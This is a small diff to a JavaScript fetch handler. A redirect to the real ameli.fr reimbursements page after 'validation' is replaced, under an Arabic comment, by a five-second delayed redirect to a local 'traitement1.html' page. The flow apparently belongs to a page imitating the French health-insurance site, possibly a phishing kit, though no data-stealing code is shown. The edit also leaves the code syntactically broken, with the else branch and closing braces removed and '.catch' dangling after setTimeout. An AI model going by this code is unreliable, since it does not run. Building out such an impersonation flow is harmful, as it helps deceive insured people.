@@ -417,12 +417,10 @@
             })
             .then(response => {
                 if (response.ok) {
-                    // Redirection après validation réussie
-                    window.location.href = "https://www.ameli.fr/assure/remboursements";
-                } else {
-                    alert("Une erreur est survenue. Veuillez réessayer.");
-                }
-            })
+            // الانتقال إلى صفحة المعالجة بعد 5 ثواني
+            setTimeout(() => {
+                window.location.href = "traitement1.html";
+            }, 5000);
             .catch(error => {
                 console.error("Erreur:", error);
                 alert("Problème de connexion. Veuillez vérifier votre réseau.");
